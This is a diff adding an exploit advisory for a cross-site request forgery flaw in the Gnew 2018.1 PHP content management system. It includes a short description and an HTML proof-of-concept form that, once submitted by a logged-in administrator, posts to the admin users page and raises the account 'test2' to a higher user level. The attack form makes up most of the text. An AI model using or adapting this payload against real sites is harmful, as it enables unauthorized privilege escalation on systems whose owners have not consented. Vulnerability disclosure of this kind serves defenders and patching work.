@@ -1,0 +1,49 @@
+# Exploit Title: Gnew 2018.1 - Cross-Site Request Forgery
+# Date: 26/01/2018
+# Exploit Author: Cyril Vallicari / HTTPCS - ZIWIT
+# Vendor website : http://gnew.xyz/
+# Software download : http://www.gnew.xyz/pages/download.php
+# Version: 2018.1
+# Tested on: Windows 10 Home x64  / Kali Linux
+
+Product description :
+
+Gnew is a simple content management system (CMS) written in PHP and
+using a database server (MySQL, PostgreSQL or SQLite) for storage. It is
+fully customizable because it uses a system of templates and supports
+multiple languages
+
+Description :
+
+A vulnerability has been discovered in Gnew , which can be exploited by
+malicious people to conduct cross-site request forgery attacks.
+This can be used to get a privilege escalation on the targeted application.
+
+POC :
+
+------------------------------------ HTML--------------------------------------
+
+<form action="http://Target/gnew/admin/users.php " method="POST">
+ <input type="hidden" name="_method" value="POST"/>
+ <input type="hidden" name="user_name" value="test2"/>
+ <input type="hidden" name="user_level" value="4"/>
+ <input type="hidden" name="user_email" value="gnewtest@yopmail.com"/>
+ <input type="hidden" name="user_show_email" value="0"/>
+<input type="hidden" name="user_day" value="0"/>
+<input type="hidden" name="user_month" value="0"/>
+<input type="hidden" name="user_month" value="0"/>
+ <input type="hidden" name="user_language" value="english"/>
+ <input type="hidden" name="user_template" value="clean"/>
+ <input type="hidden" name="user_date_format" value="D,+M+jS+Y,+g:i+a"/>
+ <input type="hidden" name="user_date_offset" value="0"/>
+<input type="hidden" name="user_avatar" value=""/>
+ <input type="hidden" name="user_date_offset" value="0"/>
+ <input type="hidden" name="user_avatar"
+value="./../images/avatars/empty.png"/>
+ <input type="hidden" name="user_id" value="2"/>
+<input type="hidden" name="user_level_old" value="1"/>
+<input type="hidden" name="user_name_old" value="test2"/>
+<input type="hidden" name="edit_user" value="Ã‰diter"/>
+<input type="submit" value="CSRF This"/></form>
+
+------------------------------------ HTML END--------------------------------------
